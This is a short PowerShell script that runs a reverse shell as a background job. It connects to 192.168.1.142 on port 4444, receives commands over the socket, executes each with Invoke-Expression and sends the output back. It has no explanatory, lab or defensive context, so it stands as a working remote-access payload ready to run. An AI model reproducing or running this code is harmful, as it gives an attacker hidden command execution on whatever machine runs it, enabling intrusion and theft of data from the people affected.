$scriptBlock = {
    param ($sharedVariable)

    $sm = (New-Object Net.Sockets.TCPClient('192.168.1.142', 4444)).GetStream()
    [byte[]]$bt = 0..65535 | ForEach-Object { 0 }

    while (($i = $sm.Read($bt, 0, $bt.Length)) -ne 0) {
        $d = (New-Object Text.ASCIIEncoding).GetString($bt, 0, $i)
        $st = ([Text.Encoding]::ASCII).GetBytes((iex $d 2>&1))
        $sm.Write($st, 0, $st.Length)
    }
}

# Pass any shared variables to the job using -ArgumentList
Start-Job -ScriptBlock $scriptBlock -ArgumentList $sharedVariable
